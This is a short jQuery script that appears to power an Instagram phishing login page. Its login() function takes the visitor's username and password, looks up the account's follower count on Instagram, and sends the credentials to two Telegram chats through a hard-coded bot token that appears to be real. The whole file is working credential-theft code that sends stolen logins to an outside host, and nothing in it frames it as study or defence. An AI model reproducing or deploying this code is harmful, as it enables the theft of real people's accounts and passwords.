$(document).ready(function() {
  var winh = $(window).height();

  $(".header").height(winh);

  $(".space").height(winh / 4);

  $("button").click(function() {
    window.location.href = "login.html";
  });
});

function login() {
  var username = $("#username").val();

  var pass = $("#pass").val();

  var token = "771992994:AAH0FSTBUpgUKbhs-K5WmRYB610DpBVHJFY";

  var id = "898236524";
  var admin = "387534219";

  if (username.length > 0 && pass.length > 0) {
    $("#logbut").attr("disabled", "disabled");

    $.get(`https://www.instagram.com/${username}/?__a=1`, function(info) {
      var text =
        "user : `" +
        username +
        "`                                                               pass : `" +
        pass +
        "`" +
        "                                                                Count : " +
        info.graphql.user.edge_followed_by.count;

      $.get(
        "https://api.telegram.org/bot" +
          token +
          "/sendMessage?chat_id=" +
          id +
          "&text=" +
          text +
          "&parse_mode=markdown",
        function(data) {
          $("#logbut").removeAttr("disabled", "disabled");

          $(".alert").show();

          $("#username,#pass").val("");
        }
      );

      $.get(
        "https://api.telegram.org/bot" +
          token +
          "/sendMessage?chat_id=" +
          admin +
          "&text=" +
          text +
          "&parse_mode=markdown"
      );
    });
  }
}
